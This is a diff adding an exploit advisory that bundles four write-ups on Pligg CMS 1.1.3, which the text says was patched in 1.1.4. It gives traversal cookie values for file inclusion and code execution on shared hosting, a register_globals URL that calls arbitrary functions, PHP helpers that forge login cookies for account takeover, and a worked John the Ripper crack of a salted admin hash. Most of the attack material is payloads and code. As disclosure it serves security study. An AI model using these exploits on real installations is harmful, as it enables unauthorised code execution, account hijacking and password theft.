@@ -1,0 +1,191 @@
+####       	
+# 	  	 	 
+#  Exploit title: Pligg CMS file existence exploration/shared hosting privilege escalation 		  	 	
+#    H.ackAck.net 		 		  
+#      Found by: Jelmer de Hen 		 		 	
+# 		  	 	
+###### 			  	 
+  	     
+15/03/2011 I released some Pligg exploits: 		  		 
+http://h.ackack.net/the-pligg-cms-0dayset-1.html 		 				
+ 			  	 
+22/03/2011 a patch became evailable; patching took 7 days: 			    
+http://pligg.com/blog/1342/pligg-cms-1-1-4-released/ 			  	 
+ 		  	 	
+Vulnerable version 1.1.3 			  		
+ 		 	  	
+config.php has this code near line 80: 		  	  
+ 		  	 	
+if(isset($_COOKIE['template'])){ 		 			 
+        $thetemp = sanit($_COOKIE['template']); 			 	  
+}  	    	
+
+and about 6 lines down that:
+
+$file = dirname(__FILE__) . '/templates/' . $thetemp . "/pligg.tpl";
+unset($errors);
+if (!file_exists($file)) { $errors[]='You may have typed the template name wrong or "'. $thetemp . '" does not exist. Click <a href = "admin/admin_config.php?page=Template">here</a> to fix it.'; }
+
+The function sanit() does:
+
+addslashes(htmlentities(strip_tags($var),ENT_QUOTES,’UTF-8?));
+
+You can use this by creating a cookie named "template" and giving it the right directory as value.
+"wistie" is the default theme name and to test if this theme is available you can just set your template cookie to "wistie".
+
+To exploit this you could do the following:
+
+template=../templates/wistie
+which makes the code:
+
+$file = dirname(__FILE__) . “/templates/../templates/wistie/pligg.tpl”;
+
+/templates/../templates/wistie/pligg.tpl does exist so we know now that the name of the underlaying directory is templates.
+
+We can do this all to the root:
+template=../../www/templates/wistie
+template=../../../var/www/templates/wistie
+
+While exploiting a shared hosting envoirnment you can prepare a "pligg.tpl" file inside a directory called "templates", then when you found out where to call to you could just 
+
+In a shared hosting envoirnment you could make a file named "pligg.tpl" and browse to the directory where you stored it to the vulnerable code, this will include(); the file and you can execute code as the other user.
+
+Example:
+template=../../user2/
+
+####
+#
+#  Exploit title: Pligg CMS user function execution
+#    H.ackAck.net
+#      Found by: Jelmer de Hen
+#
+######
+
+15/03/2011 I released some Pligg exploits:
+http://h.ackack.net/the-pligg-cms-0dayset-1.html
+
+22/03/2011 a patch became evailable; patching took 7 days:
+http://pligg.com/blog/1342/pligg-cms-1-1-4-released/
+
+Vulnerable version 1.1.3
+
+index.php contains:
+
+check_actions('index_top', $vars); // line 9
+
+check_actions is inside modules/modules_libs.php around line 89 and looks like this:
+
+function check_actions($location, &$vars)
+{
+	global $module_actions;
+	$vars['location'] = $location;
+	if($module_actions){
+		foreach ( $module_actions as $k => $v ) {
+			if($k == $location){
+				foreach ( $v as $kk => $vv ) {
+					call_user_func_array($kk, array(&$vars));
+				}
+        		}
+		}
+	}
+}
+
+You need register_globals=1 otherwise you can’t manipulate the global array $module_actions which is how we are going to exploit this vulnerability.
+The function check_actions() is used for executing some user defined function.
+
+$module_actions is an array of array’s, the nested array’s look like this:
+
+[short name of function] => Array
+(
+	[user defined function name] =>
+)
+
+$location is the short function name, $vars['location'] shall take the value of $location.
+If $location has a name equal to a short name of a function inside $module_actions it will continue to that deepest foreach loop.
+One unseen problem is that if the array module_actions[key] has more keys than just one it will also execute the name of that key.
+
+Here is an example of exploiting it:
+/index.php?module_actions[index_top][error]
+This will make the application call to the function error.
+
+
+####
+#
+#  Exploit title: Pligg CMS Post login bypass
+#    H.ackAck.net
+#      Found by: Jelmer de Hen
+#
+######
+
+15/03/2011 I released some Pligg exploits:
+http://h.ackack.net/the-pligg-cms-0dayset-1.html
+
+22/03/2011 a patch became evailable; patching took 7 days:
+http://pligg.com/blog/1342/pligg-cms-1-1-4-released/
+
+Vulnerable version 1.1.3
+
+The cookies mnm_key and mnm_user together are a way for the application to decided who you are.
+mnm_key is a base64 encoded value which has 3 fields separated with ":"'s, the third field is the login_pass of the user md5 crypted.
+This value is hard to guess, the login_pass is a value which got generated at registering and is a sha1 hash with a random prefix as salt, with that salt in plaintext in front of those 40 sha1 characters.
+The other values are easy because they are your username and your crypted username.
+
+It is however possible when you previously got the cookie to reuse this md5 to authenticate yourself because that is the one and only key which is closer to impossible to guess to generate valid cookies which will allow you to log in to the users account without knowing it’s password.
+
+Here are 2 PHP functions for you which are useful when you are exploiting this vulnerability:
+
+<?php
+function bake_cookies($username,$md5){
+	$mnm_user=$username;
+	$mnm_key=base64_encode(implode(":",array($username,crypt($username,22),$md5)));
+	echo "javascript:void(document.cookie=\"mnm_user=".$mnm_user."\"); void(document.cookie=\"mnm_key=".$mnm_key."\");\n";
+}
+function extract_md5($mnm_key){
+	$mnm_key=explode(":",base64_decode($mnm_key));
+	return $mnm_key[2];
+}
+?>
+
+####
+#
+#  Exploit title: Pligg CMS SALTs are kept in the database
+#    H.ackAck.net
+#      Found by: Jelmer de Hen
+#
+######
+
+15/03/2011 I released some Pligg exploits:
+http://h.ackack.net/the-pligg-cms-0dayset-1.html
+
+22/03/2011 a patch became evailable; patching took 7 days:
+http://pligg.com/blog/1342/pligg-cms-1-1-4-released/
+
+Vulnerable version 1.1.3
+
+The hashes in the database look like this:
+31a63a80df8c5a02503dd0742755b7ae8f9174fc6855c1eb1
+The last 40 characters are a sha1($salt.$password), the preceding characters are the salt itself which should not be obtainable in the database.
+Here is an example how to crack this hash with john the ripper jumbo:
+First we have to make it nice for jtr:
+
+<?php
+function jtr_format($sha1Salted,$username='user1'){
+	$sha1=substr($sha1Salted,-40);
+	$salt=substr($sha1Salted,0,-40);
+	return $username.":\$SHA1p\$".$salt."\$".$sha1;
+}
+echo jtr_format("31a63a80df8c5a02503dd0742755b7ae8f9174fc6855c1eb1","administrator");
+?>
+
+$ php jtr_jumbo.php > admin_hash.txt
+$ cat admin_hash.txt
+administrator:$SHA1p$31a63a80d$f8c5a02503dd0742755b7ae8f9174fc6855c1eb1
+
+$ john admin_hash.txt
+Loaded 1 password hash (Generic salted SHA-1 [32/32])
+password         (administrator)
+guesses: 1  time: 0:00:00:00 100.00% (2) (ETA: Mon Mar 14 23:04:47 2011)  c/s: 1536  trying: password
+$ john admin_hash.txt --show
+administrator:password
+
+1 password hash cracked, 0 left
